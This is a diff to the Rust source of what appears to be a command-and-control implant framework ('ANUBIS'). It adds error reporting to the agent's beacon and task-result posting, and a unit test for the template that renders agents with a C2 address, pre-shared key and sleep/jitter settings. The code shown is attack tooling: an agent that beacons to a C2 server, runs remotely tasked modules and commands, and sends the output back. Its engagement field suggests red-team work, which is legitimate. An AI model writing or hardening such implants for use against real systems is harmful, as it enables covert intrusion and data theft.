@@ -214,7 +214,9 @@ fn main() {
                 if let Some(tasks) = parse_tasks(&tasks_json) {
                     for (tid, module, args) in tasks {
                         let (ok, output) = run_module(&module, &args);
-                        let _ = post_result(&tid, &module, ok, &output);
+                        if let Err(e) = post_result(&tid, &module, ok, &output) {
+                            eprintln!("post_result error: tid={} module={} err={}", tid, module, e);
+                        }
                     }
                 }
             }
@@ -322,10 +324,10 @@ fn beacon(hostname: &str, arch: &str, pid: u32) -> Result<String, String> {
     };
     let resp = http_post("/beacon", &body)?;
     if ENCRYPT {
-        if let Some(blob) = extract_json_string(&resp, "blob") {
-            let pt = open(&blob)?;
-            return Ok(String::from_utf8_lossy(&pt).to_string());
-        }
+        let blob = extract_json_string(&resp, "blob")
+            .ok_or_else(|| format!("ANUBIS_AGENT_NO_BLOB: encrypted beacon response has no blob field (resp_len={})", resp.len()))?;
+        let pt = open(&blob)?;
+        return Ok(String::from_utf8_lossy(&pt).to_string());
     }
     Ok(resp)
 }
@@ -468,4 +470,37 @@ fn run_cmd(cmd: &str, args: &[String]) -> (bool, String) {
         .replace("__KEY_ID__", key_id)
         .replace("__ENCRYPT__", if encrypt { "true" } else { "false" })
         .replace("__UDS__", uds_path)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn render_agent_source_substitutes_all_placeholders() {
+        let src = render_agent_source(&AgentRenderParams {
+            agent_id: "agt-test123",
+            engagement_id: "eng-unit",
+            c2_bind: "127.0.0.1:9999",
+            sleep_ms: 500,
+            jitter_pct: 10,
+            os: "darwin",
+            psk_hex: "aabbccdd",
+            key_id: "kid-01",
+            encrypt: true,
+            uds_path: "/tmp/test.sock",
+        });
+        assert!(src.contains("\"agt-test123\""), "missing agent_id");
+        assert!(src.contains("\"eng-unit\""), "missing engagement_id");
+        assert!(src.contains("\"127.0.0.1:9999\""), "missing c2_bind");
+        assert!(src.contains("500"), "missing sleep_ms");
+        assert!(src.contains("\"darwin\""), "missing os");
+        assert!(src.contains("\"aabbccdd\""), "missing psk_hex");
+        assert!(src.contains("\"kid-01\""), "missing key_id");
+        assert!(src.contains("true"), "missing encrypt");
+        assert!(!src.contains("__AGENT_ID__"), "unsubstituted __AGENT_ID__");
+        assert!(!src.contains("__C2__"), "unsubstituted __C2__");
+        assert!(!src.contains("__PSK__"), "unsubstituted __PSK__");
+        assert!(!src.contains("__OS__"), "unsubstituted __OS__");
+    }
 }
